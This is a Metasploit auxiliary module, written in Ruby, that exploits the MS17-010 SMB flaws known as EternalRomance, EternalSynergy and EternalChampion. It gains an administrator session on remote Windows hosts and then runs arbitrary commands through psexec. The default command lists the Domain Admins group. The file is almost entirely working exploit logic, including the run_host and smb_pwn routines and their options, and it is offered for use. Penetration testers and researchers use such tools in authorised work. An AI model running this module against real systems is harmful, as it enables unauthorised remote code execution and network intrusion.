##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010
  include Msf::Exploit::Remote::SMB::Client::Psexec
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution',
      'Description'    => %q{
          This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where
          primitive. This will then be used to overwrite the connection session information with as an
           Administrator session. From there, the normal psexec command execution is done.

          Exploits a type confusion between Transaction and WriteAndX requests and a race condition in
          Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy
          exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a
          named pipe.
      },

      'Author'         => [
        'sleepya',          # zzz_exploit idea and offsets
        'zerosum0x0',
        'Shadow Brokers',
        'Equation Group'
      ],

      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'MSB', 'MS17-010' ],
        [ 'CVE', '2017-0143'], # EternalRomance/EternalSynergy - Type confusion between WriteAndX and Transaction requests
        [ 'CVE', '2017-0146'], # EternalChampion/EternalSynergy - Race condition with Transaction requests
        [ 'CVE', '2017-0147'], # for EternalRomance reference
        [ 'URL', 'https://github.com/worawit/MS17-010' ],
        [ 'URL', 'https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf' ],
        [ 'URL', 'https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/' ],
      ],
      'DisclosureDate' => 'Mar 14 2017',
      'Notes' =>
          {
              'AKA' => [
                  'ETERNALSYNERGY',
                  'ETERNALROMANCE',
                  'ETERNALCHAMPION',
                  'ETERNALBLUE'      # does not use any CVE from Blue, but Search should show this, it is preferred
              ]
          }
    ))

    register_options([
      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
      OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
      OptString.new('RPORT', [true, 'The Target port', 445]),
      OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
    ])

    register_advanced_options([
      OptString.new('FILEPREFIX', [false, 'Add a custom prefix to the temporary files','']),
      OptInt.new('DELAY', [true, 'Wait this many seconds before reading output and cleaning up', 0]),
      OptInt.new('RETRY', [true, 'Retry this many times to check if the process is complete', 0]),
    ])

    deregister_options('RHOST')
  end

  def run_host(ip)

    begin
      eternal_pwn(ip)         # exploit Admin session
      smb_pwn(ip)             # psexec

    rescue ::Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010::MS17_010_Error => e
      print_error("#{e.message}")
    rescue ::Errno::ECONNRESET,
           ::Rex::HostUnreachable,
           ::Rex::Proto::SMB::Exceptions::LoginError,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionRefused  => e
      print_error("#{e.class}: #{e.message}")
    rescue => error
      print_error(error.class.to_s)
      print_error(error.message)
      print_error(error.backtrace.join("\n"))
    ensure
      eternal_cleanup()       # restore session
    end
  end

  def smb_pwn(ip)
    text = "\\#{datastore['WINPATH']}\\Temp\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.txt"
    bat  = "\\#{datastore['WINPATH']}\\Temp\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.bat"
    @smbshare = datastore['SMBSHARE']
    @ip = ip

    # Try and authenticate with given credentials
    output = execute_command_with_output(text, bat, datastore['COMMAND'], @smbshare, @ip, datastore['RETRY'], datastore['DELAY'])

    # Report output
    print_good("Command completed successfuly!")
    print_status("Output for \"#{datastore['COMMAND']}\":\n")
    print_line("#{output}\n")
    report_note(
      :rhost => datastore['RHOSTS'],
      :rport => datastore['RPORT'],
      :type  => "psexec_command",
      :name => datastore['COMMAND'],
      :data => output
    )
  end
end
